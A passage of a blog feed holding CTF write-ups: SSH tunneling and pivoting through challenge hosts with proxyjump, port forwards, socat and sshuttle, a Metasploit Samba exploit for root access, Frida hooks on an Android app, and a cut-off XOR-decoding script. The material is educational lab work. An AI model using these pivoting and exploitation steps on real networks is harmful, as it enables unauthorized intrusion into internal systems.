+&lt;pre>&lt;code>Something is Beaconing to the pivot on port 58671-58680
+to ip 10.112.3.199, can you tunnel it back?
+NOTE: IT IS THE SAME ON EACH PORT ONLY USE ONE PORT
+AND REMOVE YOUR TUNNEL WHEN YOU ARE DONE
+&lt;/code>&lt;/pre>&lt;p>For this challenge we need to achieve a remote port forward.&lt;/p>
+&lt;p>Solution 1:&lt;/p>
+&lt;p>Using ssh command. First we proxyjump then perform the remote port forward.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -R 10.112.3.199:58671:127.0.0.1:5000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then on another terminal window, open a netcat listener.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -lvnp &lt;span style="color:#ae81ff">5000&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Solution 2:&lt;/p>
+&lt;p>Using ssh config. For this I&amp;rsquo;ll add a &lt;code>RemoteForward&lt;/code> option under pivot1.&lt;/p>
+&lt;pre>&lt;code>Host pivot1
+Hostname 10.218.176.199
+User whistler
+ProxyJump bastion
+RemoteForward 58671 127.0.0.1:5000
+&lt;/code>&lt;/pre>&lt;p>Then we just run &lt;code>ssh pivot1&lt;/code> and open a netcat listener.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot4.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;h3 id="5-beacons-annoying">5. Beacons Annoying&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
+&lt;pre>&lt;code>Connect to ip: 10.112.3.88 port: 7000, a beacon awaits you
+&lt;/code>&lt;/pre>&lt;p>This challenge needs a local port forward and a remote port forward.&lt;/p>
+&lt;p>Solution:&lt;/p>
+&lt;p>Using ssh command, here we proxyjump and then forward localport 7000 to our target at port 7000.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 7000:10.112.3.88:7000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then connect using netcat.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -vn 127.0.0.1 &lt;span style="color:#ae81ff">7000&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot5.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;p>Next step is using a reverse port forward to receive the flag, we need to be quick to set the port as the flag is sent after 15s.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -R 10.112.3.199:17172:127.0.0.1:6000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then on another terminal open a listener on port 6000.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -vn 127.0.0.1 &lt;span style="color:#ae81ff">6000&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot6.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;p>It was an annoying beacon indeed, we needed 4 terminal panes open (I use tmux).&lt;/p>
+&lt;h3 id="6-scan-me">6. Scan me&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
+&lt;pre>&lt;code>We deployed a ftp server but we forgot which port, find it and connect
+ftp: 10.112.3.207 user: bishop pass: geese
+&lt;/code>&lt;/pre>&lt;p>For this challenge we need to perform a portscan then a local portforward. However, port scanning over a tunnel can be quite slow
+or sometimes fail. I ended up uploading an nmap binary to pivot1 and then scan the target.&lt;/p>
+&lt;p>Solution:&lt;/p>
+&lt;p>Building on the previous ssh config, I&amp;rsquo;ll use scp to upload nmap. Nmap needs a services file to run, we need to upload that as well. Then from pivot1
+we can perform a full portscan.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">scp /opt/nmap-7.91SVN-x86_64-portable/nmap pivot1:/tmp
+scp /opt/nmap-7.91SVN-x86_64-portable/data/nmap-services pivot1:/tmp
+./nmap --datadir /tmp -p- 10.112.3.207
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot7.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;p>After getting the port, let&amp;rsquo;s use sshuttle to add a route to the ftp server.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sshuttle -r pivot1 10.112.3.207/32
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next is to just connect to the ftp server, the flag was in the banner.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot8.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;h3 id="7-another-pivot">7. Another Pivot&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
+&lt;pre>&lt;code>Connect to the second pivot
+IP: 10.112.3.12
+User: crease
+Pass: NoThatsaV
+&lt;/code>&lt;/pre>&lt;p>More proxyjumps.&lt;/p>
+&lt;p>Solution 1:&lt;/p>
+&lt;p>Multiple proxyjumps can be separated by a comma.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -J tunneler@104.131.101.182:2222,whistler@10.218.176.199 crease@10.112.3.12
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Solution 2:&lt;/p>
+&lt;p>I&amp;rsquo;ll update ssh config with this new pivot.&lt;/p>
+&lt;pre>&lt;code>Host pivot2
+Hostname 10.112.3.12
+User crease
+ProxyJump pivot1
+&lt;/code>&lt;/pre>&lt;p>Then run&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh pivot2
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This host is connected to multiple networks and it seems portforwarding is disabled here, therefore we&amp;rsquo;ll have some fun with socat!&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot9.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;h3 id="8-snmp">8. SNMP&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
+&lt;pre>&lt;code>There is a snmp server at 10.24.13.161
+&lt;/code>&lt;/pre>&lt;p>This challenge is interesting because snmp runs over udp, you can&amp;rsquo;t really create a udp tunnel. We&amp;rsquo;ll tunnel udp inside a tcp tunnel.
+Since in pivot2 tunneling is disabled we&amp;rsquo;ll use socat.&lt;/p>
+&lt;p>Solution:&lt;/p>
+&lt;p>First we ssh into pivot2 then open a tcp listener which redirects traffic to udp out to snmp.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">socat TCP4-LISTEN:5000,fork UDP4:10.24.13.161:161
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next we open a local portforward through pivot1 to the tcp port on pivot2 we opened above, I&amp;rsquo;ll use the full ssh command here.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 5000:10.112.3.12:5000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then on our local machine we use socat again to redirect from local udp 161 to local port 5000 that would be forwarded by the above tunnel.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo socat UDP4-LISTEN:161,fork TCP:localhost:5000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then finally we run snmpwalk against localhost and the traffic is forwarded through the long tunnel created.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">snmpwalk -v1 -c public localhost
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot10.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;h3 id="9-samba">9. Samba&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
+&lt;pre>&lt;code>There is a samba server at 10.24.13.10, find a flag sitting in the root file system /
+nothing to find in the shares
+&lt;/code>&lt;/pre>&lt;p>Similar to the snmp one above we&amp;rsquo;ll use socat to tunnel to the samba server.&lt;/p>
+&lt;p>Solution:&lt;/p>
+&lt;p>First we ssh into pivot2 and use socat to redirect traffic&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">socat -v TCP-LISTEN:5000,fork TCP:10.24.13.10:445
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then perform a local portforward through pivot1 to pivot2&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199 -L 5000:10.112.3.12:5000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Based on the challenge description, we need to access the root file system and nothing is in the shares. Sounds like
+we need to exploit it as there&amp;rsquo;s no other way to access the root file system.&lt;/p>
+&lt;p>Solution:&lt;/p>
+&lt;p>Run nmap to find the samba version and check for exploit in exploitdb using searchsploit.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sC -sV -p &lt;span style="color:#ae81ff">5000&lt;/span> 127.0.0.1
+searchsploit samba
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot11.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;p>There are several metasploit exploits listed for samba therefore we&amp;rsquo;ll use it.
+The exploit that worked is &lt;code>exploit/linux/samba/is_known_pipename&lt;/code> and we get the flag.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot12.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;h3 id="10-browsing-website-2">10. Browsing website 2&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
+&lt;pre>&lt;code>Browse to http://2a02:6b8:b010:9010:1::86/
+&lt;/code>&lt;/pre>&lt;p>This challenge shows portforwarding from ipv4 to ipv6. We&amp;rsquo;ll use socat too on this one.&lt;/p>
+&lt;p>Solution:&lt;/p>
+&lt;p>First we ssh into pivot1 then use socat to redirect traffic from ipv4 to ipv6.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">socat -v TCP-LISTEN:5000,fork TCP6:&lt;span style="color:#f92672">[&lt;/span>2a02:6b8:b010:9010:1::86&lt;span style="color:#f92672">]&lt;/span>:80
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then forward local port 5000 through pivot1 to pivot 2&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh pivot1 -L 5000:10.112.3.12:5000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then make the web request to local port 5000 which will be forwarded through the tunnel created.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl localhost:5000
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot13.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;p>The final base ssh config looked like this without the port forwards:&lt;/p>
+&lt;pre>&lt;code>Host bastion
+Hostname 104.131.101.182
+User tunneler
+Port 2222
+Host pivot1
+Hostname 10.218.176.199
+User whistler
+ProxyJump bastion
+Host pivot2
+Hostname 10.112.3.12
+User crease
+ProxyJump pivot1
+&lt;/code>&lt;/pre>&lt;h1 id="conclusion">Conclusion&lt;/h1>
+&lt;p>There are several techniques to make your tunneling much easier, for quick use like in a ctf I think crafting the full ssh command is better and
+faster. For frequent connection, using sshuttle combined with a good ssh config can make your life much easier.&lt;/p>
+&lt;p>After all those connections here&amp;rsquo;s a Network Diagram that visualizes the access we were able to achieve with the tunnels:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/Tunneler.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;p>Here&amp;rsquo;s a nice writeup by &lt;a href="https://twitter.com/Rayhan0x01" target="_blank" rel="noopener">@Rayhan0x01&lt;/a>
+on how he used a different approach using metasploit:&lt;/p>
+&lt;p>&lt;a href="https://rayhan0x01.github.io/ctf/2020/08/08/defcon-redteamvillage-ctf-tunneler-1,2,3,4,5,7,9.html">https://rayhan0x01.github.io/ctf/2020/08/08/defcon-redteamvillage-ctf-tunneler-1,2,3,4,5,7,9.html&lt;/a>&lt;/p>
+&lt;h1 id="resources">Resources&lt;/h1>
+&lt;p>Some resources I think are helpful in understanding ssh tunneling properly.&lt;/p>
+&lt;ol>
+&lt;li>&lt;a href="https://www.redhat.com/sysadmin/ssh-proxy-bastion-proxyjump">https://www.redhat.com/sysadmin/ssh-proxy-bastion-proxyjump&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/">https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/tunneling-and-port-forwarding">https://book.hacktricks.xyz/tunneling-and-port-forwarding&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://linuxize.com/post/how-to-setup-ssh-tunneling/">https://linuxize.com/post/how-to-setup-ssh-tunneling/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.tecmint.com/create-ssh-tunneling-port-forwarding-in-linux/">https://www.tecmint.com/create-ssh-tunneling-port-forwarding-in-linux/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://app.cyberranges.com/scenario/5d5c06ed960f032f2eadd733">https://app.cyberranges.com/scenario/5d5c06ed960f032f2eadd733&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://app.cyberranges.com/scenario/5d5eaf28960f032f2eae6add">https://app.cyberranges.com/scenario/5d5eaf28960f032f2eae6add&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://app.cyberranges.com/scenario/5d640b0c960f032f2eb033a8">https://app.cyberranges.com/scenario/5d640b0c960f032f2eb033a8&lt;/a>&lt;/li>
+&lt;/ol>
+&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
+&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p>
+&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p></content></item><item><title>RaziCTF 2020 WriteUp: Chasing a lock</title><link>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</link><pubDate>Wed, 28 Oct 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</guid><description/><content>&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>I recently participated in &lt;a href="https://ctftime.org/event/1167" target="_blank" rel="noopener">RaziCTF 2020&lt;/a>
+with team
+&lt;a href="https://ctftime.org/team/112710" target="_blank" rel="noopener">fr344aks&lt;/a>
+and I was able to solve an android challenge that I thought
+needs a proper writeup.
+I was able to reverse engineer the provided app and use frida for dynamic analysis for a quick win.&lt;/p>
+&lt;h3 id="challenge-description">Challenge Description:&lt;/h3>
+&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot1.png" alt="razictf" class="center" style="border-radius: 8px;" />
+&lt;p>I first installed the app in my genymotion emulator to see the basic functionality. There is a padlock icon
+constantly changing position on the screen and text at the bottom that says &lt;code>20000 to break the lock&lt;/code>.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot2.png" alt="razictf" class="center" style="border-radius: 8px;" />
+&lt;p>When I click on the padlock the number decreases by 1. This is definitely chasing a lock as the challenge name.&lt;/p>
+&lt;p>The goal seems pretty straightforward, we need to get the value to zero to get the flag. Now to decompile the app and see if we
+can find a way. Like my previous writeup, I&amp;rsquo;ll use jadx-gui.&lt;/p>
+&lt;p>From the AndroidManifest.xml we get the MainActivity that is loaded when the app starts.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot3.png" alt="razictf" class="center" style="border-radius: 8px;" />
+&lt;p>Looking at the MainActivity code we see a switcher object being initialized just before the if statement that does some
+check before displaying the flag. The switcher object has a method &lt;code>run&lt;/code> that takes in a value &lt;code>i&lt;/code> and the output is checked
+if it&amp;rsquo;s not null and then the flag is displayed.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot4.png" alt="razictf" class="center" style="border-radius: 8px;" />
+&lt;p>Let&amp;rsquo;s look at run method in the switcher class as it&amp;rsquo;s output determines whether the flag is displayed.
+In the switcher code we can see the method &lt;code>run&lt;/code>. Instead of trying to figure out what each line does, I saw it easier to just hook into
+this method and manipulate the &lt;code>i&lt;/code> value, which at this point I believe is the 20000 value.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot5.png" alt="razictf" class="center" style="border-radius: 8px;" />
+&lt;p>I found two ways to solve this with frida, the run method was actually the one returning the flag:&lt;/p>
+&lt;p>First one is to hook into the method and change the input value &lt;code>i&lt;/code> as it gets called.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">perform&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span>(){
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">switcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">use&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.example.razictf_2.switcher&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">switcher&lt;/span>.&lt;span style="color:#a6e22e">run&lt;/span>;
+&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>)
+&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Hooking...&amp;#34;&lt;/span>);
+&lt;span style="color:#a6e22e">run&lt;/span>.&lt;span style="color:#a6e22e">overload&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;int&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">implementation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">x&lt;/span>){
+&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Original Input: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>);
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">run&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>)
+&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Original return: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span>)
+&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Modified Input: 0&amp;#34;&lt;/span>);
+&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[*] Modified return: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">run&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>))
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ret&lt;/span>;
+};
+});
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>When I click on the padlock in the app, the flag is given.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot6.png" alt="razictf" class="center" style="border-radius: 8px;" />
+&lt;p>Second one is to just initialize the switcher object ourselves and call the run method directly with our input without hooking.
+This way I don&amp;rsquo;t need to interact with the app.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">perform&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span>(){
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">switcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Java&lt;/span>.&lt;span style="color:#a6e22e">use&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;com.example.razictf_2.switcher&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">switcherInstance&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">switcher&lt;/span>.&lt;span style="color:#a6e22e">$new&lt;/span>();
+&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>);
+&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Flag: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">switcherInstance&lt;/span>.&lt;span style="color:#a6e22e">run&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>));
+});
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/razictf_2020/screenshot7.png" alt="razictf" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;code>Flag: RaziCTF{IN_HATE_0F_RUNN!NG_L0CK5}&lt;/code>&lt;/p>
+&lt;h1 id="conclusion">Conclusion&lt;/h1>
+&lt;p>This was a good learning experience for me especially the second part which is quicker and has less code.&lt;/p>
+&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
+&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p>
+&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p></content></item><item><title>CyberSpaceKenya CTF: ZuluMeats3</title><link>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</link><pubDate>Fri, 12 Jun 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</guid><description/><content>&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>I recently worked on a CTF challenge by &lt;a href="https://twitter.com/CyberSpaceKenya" target="_blank" rel="noopener">CyberSpace Kenya&lt;/a>
+which I ended up winning. This is a writeup on how I solved the challenge. We were provided with an android app to reverse engineer and submit 3 flags.&lt;/p>
+&lt;h2 id="flag-3">Flag 3&lt;/h2>
+&lt;p>I haven&amp;rsquo;t done tons of mobile app reverse engineering but as I was learning about the subject in previous challenges I found this 2-step approach to work well:&lt;/p>
+&lt;ul>
+&lt;li>Extracting the apk contents with apktool&lt;/li>
+&lt;li>Reversing the app code with jadx-gui&lt;/li>
+&lt;/ul>
+&lt;p>Using apktool is pretty simple just run this command on the apk:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&amp;gt; apktool d cyberspace-ctf.apk
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This generates files in a folder cyberspace-ctf as below:&lt;/p>
+&lt;pre>&lt;code>.
+├── AndroidManifest.xml
+├── apktool.yml
+├── assets
+├── lib
+├── original
+├── res
+├── smali
+└── unknown
+&lt;/code>&lt;/pre>&lt;p>Checking the AndroidManifest.xml and res/values/strings.xml doesn&amp;rsquo;t reveal any flag. Usually grepping recursively through the apk files for interesting names would hint at something. After a few tries with the words flag, flag1, flag2, flag3 I got some interesting output.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf1.png" alt="cyberspacectf" class="center" style="border-radius: 8px;" />
+&lt;p>Without much thought I opened jadx to find more mentions of that ValidateFlag3 and found the code.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf2.png" alt="cyberspacectf" class="center" style="border-radius: 8px;" />
+&lt;p>Reading through the code I was able to figure out that the validate function does the following:&lt;/p>
+&lt;ol>
+&lt;li>takes our input&lt;/li>
+&lt;li>xor encrypts it with a key(which is generated by getKey() function)&lt;/li>
+&lt;li>base64 encodes it&lt;/li>
+&lt;li>checks if it is equal to the hardcoded flag3.&lt;/li>
+&lt;/ol>
+&lt;p>From previous experience I know that with xor encryption if you have the key and the encrypted data getting the plain text output is simple. Let me illustrate:&lt;/p>
+&lt;pre>&lt;code>encrypted = key ^ plaintext
+plaintext = key ^ encrypted
+&lt;/code>&lt;/pre>&lt;p>Getting the code to work in java isn&amp;rsquo;t as easy so I decided to use python and script the solution.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> base64
+key1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;hUZAf9gFIARRFTAvKRDs8A==&amp;#34;&lt;/span>
+key2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;gp9jPELztMsd51Ih81gO0Q==&amp;#34;&lt;/span>
+flag3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;RJ9qOOqa7pAinT19vyuQRHOGSi3FnPW5La0BYb4tnw==&amp;#34;&lt;/span>
+data1 &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64decode(key1)
+data2 &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64decode(key2)
+key &lt;span style="color:#f92672">=&lt;/span> []
+&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(data2)):
+key&lt;span style="color:#f92672">.&lt;/span>append(data1[i] &lt;span style="color:#f92672">^&lt;/span> data2[i])
+decodedflag &lt;span style="color:#f92672">=&lt;/span> []
+input &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64decode(flag3)
+encryptedFlag &lt;span style="color:#f92672">=&lt;/span> input
+&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(encryptedFlag)):
